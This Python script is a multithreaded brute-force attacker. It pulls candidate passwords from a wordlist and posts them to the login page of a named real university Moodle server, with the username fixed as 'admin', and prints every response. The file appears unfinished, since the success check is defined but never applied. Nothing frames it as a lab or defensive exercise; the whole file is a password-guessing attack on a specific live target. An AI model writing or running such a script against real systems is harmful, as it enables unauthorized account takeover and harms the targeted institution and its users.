import requests
from http import cookies
import sys
import queue
import threading
from html import parser

threads = 10
username = "admin"
wordlist_file = "/tmp/cain.txt"
resume = None

target = {'url': "http://moodle.mcu.edu.tw/login/index.php",
          'post': "http://moodle.mcu.edu.tw/login/index.php"}

username_field = "username"
password_field = "password"

success_check = "setting"

class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_queue = words
        self.found = False
        print("Set up for " + username)

    def run(self):
        for i in range(threads):
            t = threading.Thread(target=self.bruter)
            t.start()

    def bruter(self):
        while not self.password_queue.empty() and not self.found:
            password = self.password_queue.get().strip()
            get_response = requests.get(target['url'])

            post_data = {username_field: self.username, password_field: password}
            post_response = requests.post(target['post'], data=post_data, cookies=get_response.cookies)

            print(post_response.text.__repr__())

            


